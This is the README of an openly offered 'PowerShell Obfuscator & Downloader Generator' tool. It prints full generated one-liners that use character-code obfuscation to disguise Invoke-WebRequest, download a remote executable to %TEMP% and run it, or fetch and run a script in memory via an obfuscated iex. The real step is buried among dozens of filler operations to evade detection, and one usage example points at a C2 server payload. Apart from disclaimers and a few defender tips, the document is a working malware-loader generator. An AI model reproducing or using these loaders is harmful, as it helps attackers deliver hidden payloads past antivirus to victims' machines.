# 🔒 PowerShell Obfuscator & Downloader Generator

> **⚠️ EDUCATIONAL PURPOSE ONLY** - This tool is designed for cybersecurity research, penetration testing, and educational purposes. Use responsibly and only on systems you own or have explicit permission to test.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![.NET](https://img.shields.io/badge/.NET-6.0-blue.svg)](https://dotnet.microsoft.com/)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Security Considerations](#security-considerations)
- [Legal Disclaimer](#legal-disclaimer)
- [Contributing](#contributing)
- [License](#license)

## 🎯 Overview

PowerShell Obfuscator & Downloader Generator is a C# console application designed for cybersecurity professionals, penetration testers, and researchers. It generates heavily obfuscated PowerShell scripts that can download and execute files while evading basic detection mechanisms.

### 🎓 Educational Value

This project demonstrates:
- **Obfuscation Techniques**: Character-based command obfuscation
- **Payload Hiding**: Concealing malicious code within legitimate-looking operations
- **Anti-Detection Methods**: Techniques used by malware authors
- **PowerShell Security**: Understanding how attackers bypass security measures

## ✨ Features

### 🔧 Core Functionality
- **Interactive Console Interface**: User-friendly prompts with color-coded output
- **Dual Execution Modes**:
  - Download to `%TEMP%` folder and execute (works with any file type)
  - Execute in memory (PowerShell scripts only)
- **Advanced Obfuscation**:
  - 100+ useless operations to hide the real payload
  - Character-based command obfuscation using ASCII codes
  - Hidden payload buried in the middle of harmless code
- **One-liner Output**: Generates a single-line PowerShell script for easy deployment

### 🛡️ Obfuscation Techniques
- **Command Obfuscation**: `Invoke-WebRequest` → `&($([char]73+[char]110+...))`
- **Variable Obfuscation**: Random variable names and operations
- **String Obfuscation**: Character concatenation for sensitive strings
- **Flow Obfuscation**: Buried payload within legitimate-looking code

## 🚀 Installation

### Prerequisites
- Windows 10/11 or Windows Server 2016+
- .NET 6.0 Runtime (included in self-contained build)
- PowerShell 5.1+ or PowerShell Core 6.0+

### Quick Start

1. **Download the latest release** from the [Releases](https://github.com/MidasRX/EXETOPS1/releases) page

2. **Extract the files** to your desired location

3. **Run the executable**:
   ```cmd
   PowerShellObfuscator.exe
   ```

### Build from Source

```bash
# Clone the repository
git clone https://github.com/MidasRX/EXETOPS1.git
cd powershell-obfuscator

# Build the project
dotnet build --configuration Release

# Create self-contained executable
dotnet publish --configuration Release --runtime win-x64 --self-contained true --output ./dist

# Run the executable
./dist/PowerShellObfuscator.exe
```

## 📖 Usage

### Basic Usage

1. **Launch the application**:
   ```cmd
   PowerShellObfuscator.exe
   ```

2. **Follow the interactive prompts**:
   ```
   ╔══════════════════════════════════════════════════════════════╗
   ║              PowerShell Obfuscator Generator                 ║
   ║                     By MidasRX                               ║
   ╚══════════════════════════════════════════════════════════════╝

   Enter the file URL: https://example.com/legitimate-script.ps1
   Enter the output filename (with extension): script.ps1
   Choose execution method:
   1. Download to %TEMP% and execute
   2. Execute in memory (PowerShell scripts only)
   Enter choice (1 or 2): 2
   ```

3. **Generated output** will be saved to your user profile folder with a timestamp

### Advanced Usage

#### For Penetration Testing
```cmd
# Generate obfuscated payload for red team exercises
PowerShellObfuscator.exe
# Enter: https://your-c2-server.com/payload.exe
# Enter: payload.exe
# Choose: 1 (temp folder execution)
```

#### For Security Research
```cmd
# Generate in-memory execution for PowerShell scripts
PowerShellObfuscator.exe
# Enter: https://github.com/raw/legitimate-script.ps1
# Enter: research.ps1
# Choose: 2 (in-memory execution)
```

## 📝 Examples

### Example 1: Basic File Download
**Input:**
```
URL: https://example.com/update.exe
Filename: update.exe
Method: Temp folder execution
```

**Generated Output:**
```powershell
$randomVar1 = Get-Random -Minimum 1 -Maximum 1000; $string1 = "abcdefghijklmnopqrstuvwxyz" * 3; $date1 = Get-Date; $guid1 = [System.Guid]::NewGuid(); $math1 = [Math]::Sqrt(144) * [Math]::PI; $array1 = @(1,2,3,4,5) | ForEach-Object { $_ * 2 }; $hash1 = @{ "key1" = "value1" }; $split1 = "one,two,three".Split(','); $join1 = @("a","b","c") -join "-"; $trim1 = "  spaces  ".Trim(); $replace1 = "hello world".Replace("world", "universe"); $substring1 = "PowerShell".Substring(0, 5); $length1 = "test".Length; $check1 = "PowerShell" -like "Power*"; $case1 = "TEST" -ceq "test"; $greater1 = 10 -gt 5; $less1 = 3 -lt 7; $logical1 = ($true -and $false); $logical2 = ($true -or $false); $logical3 = -not $false; $null1 = $null -eq $null; $type1 = 123 -is [int]; $cast1 = [string]456; $array2 = @(1,2,3) -contains 2; $where1 = @(1,2,3,4,5) | Where-Object { $_ -gt 3 }; $sort1 = @("c","a","b") | Sort-Object; $measure1 = @(1,2,3,4,5) | Measure-Object -Sum; $group1 = @("a","a","b","b") | Group-Object; $foreach1 = 1..5 | ForEach-Object { "Number: $_" }; $for1 = for($i=0; $i -lt 3; $i++) { "Index: $i" }; $while1 = $counter = 0; while($counter -lt 2) { $counter++ }; $doWhile1 = $counter2 = 0; do { $counter2++ } while($counter2 -lt 2); $switch1 = switch(2) { 1 {"One"} 2 {"Two"} default {"Other"} }; $try1 = try { 1/0 } catch { "Error caught" }; $error1 = $Error.Count; $warning1 = $WarningPreference; $verbose1 = $VerbosePreference; $debug1 = $DebugPreference; $progress1 = $ProgressPreference; $random1 = @("Red","Blue","Green","Yellow") | Get-Random; &($([char]73+[char]110+[char]118+[char]111+[char]107+[char]101+[char]45+[char]87+[char]101+[char]98+[char]82+[char]101+[char]113+[char]117+[char]101+[char]115+[char]116)) -Uri "https://example.com/update.exe" -OutFile "$env:TEMP\update.exe"; & "$env:TEMP\update.exe"; $current1 = Get-Location; $path1 = [System.IO.Path]::DirectorySeparatorChar; $invalid1 = [System.IO.Path]::GetInvalidFileNameChars(); $temp1 = [System.IO.Path]::GetTempFileName(); $extension1 = [System.IO.Path]::GetExtension("file.txt"); $fileName1 = [System.IO.Path]::GetFileNameWithoutExtension("test.ps1"); $directory1 = [System.IO.Path]::GetDirectoryName("C:\Windows\System32"); $pathCombine1 = [System.IO.Path]::Combine("C:", "Users", "Public"); $absolute1 = [System.IO.Path]::IsPathRooted("C:\Windows"); $env1 = Get-ChildItem Env: | Select-Object -First 5; $aliases1 = Get-Alias | Select-Object -First 5; $functions1 = Get-ChildItem Function: | Select-Object -First 5; $variables1 = Get-Variable | Select-Object -First 5; $modules1 = Get-Module | Select-Object -First 3; $commands1 = Get-Command | Select-Object -First 5; $history1 = Get-History -Count 1; $random2 = Get-Random -SetSeed 12345; $unicode1 = "😀😁"; $ascii1 = "ABC".ToCharArray() | ForEach-Object { [int]$_ }; $binary1 = [Convert]::ToString(255, 2); $hex1 = [Convert]::ToString(255, 16); $octal1 = [Convert]::ToString(255, 8); $base64_1 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Hello1")); $memory1 = [System.IO.MemoryStream]::new(); $stringReader1 = [System.IO.StringReader]::new("Test"); $stringWriter1 = [System.IO.StringWriter]::new(); $textInfo1 = (Get-Culture).TextInfo; $numberFormat1 = (Get-Culture).NumberFormat; $dateTimeFormat1 = (Get-Culture).DateTimeFormat; $calendar1 = (Get-Culture).Calendar; $encoding1 = [System.Text.Encoding]::UTF8; $decoder1 = $encoding1.GetDecoder(); $encoder1 = $encoding1.GetEncoder(); $charArray1 = "Hello".ToCharArray(); $byteArray1 = [System.Text.Encoding]::UTF8.GetBytes("Hello"); $stringFromBytes1 = [System.Text.Encoding]::UTF8.GetString($byteArray1); $randomTimer1 = [System.Diagnostics.Stopwatch]::StartNew(); Start-Sleep -Milliseconds 1; $randomTimer1.Stop(); $elapsed1 = $randomTimer1.Elapsed; $assembly1 = [System.Reflection.Assembly]::GetExecutingAssembly(); $type1 = [System.String]; $methods1 = $type1.GetMethods() | Select-Object -First 3; $properties1 = $type1.GetProperties() | Select-Object -First 3; $constructors1 = $type1.GetConstructors(); $genericType1 = [System.Collections.Generic.List[string]]; $list1 = [System.Collections.Generic.List[int]]::new(); $list1.Add(1); $list1.Add(2); $list1.Add(3); $dictionary1 = [System.Collections.Generic.Dictionary[string,int]]::new(); $dictionary1.Add("one", 1); $dictionary1.Add("two", 2); $queue1 = [System.Collections.Generic.Queue[string]]::new(); $queue1.Enqueue("first"); $queue1.Enqueue("second"); $stack1 = [System.Collections.Generic.Stack[string]]::new(); $stack1.Push("bottom"); $stack1.Push("top"); $hashSet1 = [System.Collections.Generic.HashSet[int]]::new(); $hashSet1.Add(1); $hashSet1.Add(2); $hashSet1.Add(1); $sortedSet1 = [System.Collections.Generic.SortedSet[int]]::new(); $sortedSet1.Add(3); $sortedSet1.Add(1); $sortedSet1.Add(2); $final1 = "Script completed with hidden payload executed"
```

### Example 2: In-Memory Execution
**Input:**
```
URL: https://raw.githubusercontent.com/legitimate/script.ps1
Filename: script.ps1
Method: In-memory execution
```

**Generated Output:**
```powershell
[50+ useless operations]... &($([char]105+[char]101+[char]120)) (($([char]73+[char]110+$([char]118)+$([char]111)+$([char]107)+$([char]101)+$([char]45)+$([char]87)+$([char]101)+$([char]98)+$([char]82)+$([char]101)+$([char]113)+$([char]117)+$([char]101)+$([char]115)+$([char]116))+' -Uri "https://raw.githubusercontent.com/legitimate/script.ps1" -UseBasicParsing).Content'); [50+ more useless operations]...
```

## 🔒 Security Considerations

### For Defenders
- **Detection Methods**: Learn to identify obfuscated PowerShell commands
- **Monitoring**: Implement PowerShell logging and monitoring
- **Execution Policy**: Use appropriate execution policies
- **Antivirus**: Keep antivirus software updated

### For Researchers
- **Sandbox Testing**: Always test in isolated environments
- **Network Monitoring**: Monitor network traffic during testing
- **Log Analysis**: Review PowerShell logs for suspicious activity
- **Documentation**: Document all testing activities

## ⚖️ Legal Disclaimer

**IMPORTANT**: This software is provided for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.

### 🚨 Legal Notice
- **Authorized Use Only**: Use only on systems you own or have explicit written permission to test
- **No Warranty**: This software is provided "as is" without warranty
- **No Liability**: The authors are not responsible for any misuse or damage
- **Compliance**: Users must comply with all applicable laws and regulations

### 📋 Acceptable Use Cases
- ✅ Cybersecurity education and training
- ✅ Penetration testing with proper authorization
- ✅ Security research in controlled environments
- ✅ Red team exercises with written permission
- ✅ Academic research and studies

### ❌ Unacceptable Use Cases
- ❌ Unauthorized access to systems
- ❌ Malicious attacks or cybercrime
- ❌ Testing on systems without permission
- ❌ Distribution of malware or harmful code
- ❌ Any illegal activities

## 🤝 Contributing

We welcome contributions from the cybersecurity community!

### How to Contribute
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Contribution Guidelines
- Follow existing code style and conventions
- Add appropriate documentation
- Include tests for new features
- Ensure all code is for educational purposes only
- Respect security and privacy considerations

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2024 PowerShell Obfuscator Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
### Getting Help
- **Issues**: Report bugs or request features via [GitHub Issues](https://github.com/yourusername/powershell-obfuscator/issues)
- **Discussions**: Join community discussions in [GitHub Discussions](https://github.com/yourusername/powershell-obfuscator/discussions)
- **Security**: Report security vulnerabilities privately via [Security Advisories](https://github.com/yourusername/powershell-obfuscator/security/advisories)

### Resources
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/security/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

<div align="center">

**🔒 Remember: With great power comes great responsibility. Use this tool ethically and legally.**

Made with ❤️ for the cybersecurity community

</div>
